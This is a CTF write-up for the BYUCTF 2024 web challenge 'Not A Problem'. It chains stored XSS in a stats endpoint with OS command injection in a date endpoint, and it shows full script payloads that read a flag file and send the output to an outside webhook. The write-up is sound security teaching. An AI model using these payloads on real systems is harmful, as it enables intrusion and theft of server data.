---
layout: post
title: BYUCTF 2024 | Not a Problem-writeup
date: 2024-05-23
tags: ['BYUCTF24']
---
# Web/Not A Problem Writeup

## Challenge Description
The challenge gives us two links, one for the admin bot and other for the server.
- The admin bot visits the url endpoint given by user input with the cookie `secret` set.
- On the server we can view or add stats, there is one aditional endpoint `/api/date` which is only accessible when you have the `secret` cookie. (which we have no way to get) 
- flag.txt in the current directory that contains the challenge flag.

Source code of the major endpoints is as given
```python

@app.route('/api/stats/<string:id>', methods=['GET'])
def get_stats(id):
    for stat in stats:
        if stat['id'] == id:
            return str(stat['data'])
        
    return '{"error": "Not found"}'


# add stats
@app.route('/api/stats', methods=['POST'])
def add_stats():
    try:
        username = request.json['username']
        high_score = int(request.json['high_score'])
    except:
        return '{"error": "Invalid request"}'
    
    id = str(uuid.uuid4())

    stats.append({
        'id': id,
        'data': [username, high_score]
    })
    return '{"success": "Added", "id": "'+id+'"}'

# current date
@app.route('/api/date', methods=['GET'])
def get_date():
    # get "secret" cookie
    cookie = request.cookies.get('secret')

    # check if cookie exists
    if cookie == None:
        return '{"error": "Unauthorized"}'
    
    # check if cookie is valid
    if cookie != SECRET:
        return '{"error": "Unauthorized"}'
    
    modifier = request.args.get('modifier','')
    
    return '{"date": "'+subprocess.getoutput("date "+modifier)+'"}'

```

## Solution

It looks like the parameter `modifier` of the /api/date is vulnerable to os command injection

`return '{"date": "'+subprocess.getoutput("date "+modifier)+'"}'`

It is returning the date but passing the modifier into the subprocess.getoutput() directly without input validation, so we can inject our command into modifier parameter. But the endpoint is only accessible by the admin bot. Next we need to find a way to make the admin bot visit this endpoint with our command injection payload.

On examining the `/api/stats/<string:id>` endpoint, we see that the username is returned as it is without validation, so there is possibly `XSS`. By sending the POST request to `/api/stats` with body:
```json
{
"username":"<script>alert("XSS")</script>",
"high_score":1337
}

``` 
 and visiting the stats of the id recieved, we got the alert on our screen, hence `XSS` is achieved.

Now that we have `XSS` and `command injection` vulnerabilities let's chain them to read the flag. so basically we need to: 

- make the admin visit the `/api/date` with our command injection payload to read the flag. 
- return the response to our web hooker

but `/api/date` endpoint is banned to use in the url bar of the admin bot.
So we leverage the `XSS` on `/api/stats/<string:id>` endpoint to make admin bot redirect to `/api/date` with username payload :
```js
<script>fetch('http://127.0.0.1:1337/api/date?modifier={payload-here}')</script>
```

Next we need to be able to return the output to our web hook, so we set up our webhook and our revised username payload becomes:

 ```js
 <script>fetch('http://127.0.0.1:1337/api/date?modifier=; echo "Hello"').then(resp=>resp.text()).then((data)=>{document.location='https://mitsurisenpai.requestcatcher.com?b='+JSON.stringify(data)})</script>
 ``` 

 We recieved the request on our webhook: `GET /?b=%22{\%22date\%22:%20\%22Mon%20May%2020%2013:24:23%20UTC%202024\nHello\%22}%22`

 The command injection is successful, now to get the flag the final payload we used was:

 ```js
 <script>fetch('http://127.0.0.1:1337/api/date?modifier=;base64 flag.txt').then(resp=>resp.text()).then((data)=>{document.location='https://mitsurisenpai.requestcatcher.com?b='+JSON.stringify(data)})</script>
 ```

 (We used the base64 to avoid confusion between special characters and url encoding on the flag)

 By sending this we recieved this request:
 `GET /?b=%22{\%22date\%22:%20\%22Mon%20May%2020%2013:30:33%20UTC%202024\nYnl1Y3RmeyJub3RfYV9wcm9ibGVtIl9ZRUFIX1JJR0hUfQ==\%22}%22`

 On decoding the base64 part `Ynl1Y3RmeyJub3RfYV9wcm9ibGVtIl9ZRUFIX1JJR0hUfQ==` , we recieved the flag :

 `byuctf{"not_a_problem"_YEAH_RIGHT}` 